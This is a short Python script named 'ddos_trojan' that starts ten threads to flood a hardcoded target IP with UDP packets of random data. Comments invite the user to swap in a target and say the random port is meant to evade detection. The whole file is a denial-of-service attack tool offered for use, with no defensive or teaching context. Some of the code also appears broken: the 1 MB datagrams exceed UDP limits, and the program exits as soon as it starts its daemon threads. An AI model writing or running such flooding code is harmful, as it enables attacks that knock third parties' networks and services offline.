import os
import random
import socket
import threading

def send_data(target_ip, target_port):
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = os.urandom(1024 * 1024)  # Random data to flood the network
        sock.sendto(data, (target_ip, target_port))

def ddos_trojan():
    target_ip = "192.168.1.1"  # Replace with your target IP or use input()
    target_port = random.randint(1024, 65535)  # Random port to avoid easy detection

    threads = []
    for _ in range(10):  # Number of threads (adjust as needed)
        thread = threading.Thread(target=send_data, args=(target_ip, target_port))
        thread.daemon = True
        threads.append(thread)
    
    for thread in threads:
        thread.start()

if __name__ == "__main__":
    ddos_trojan()
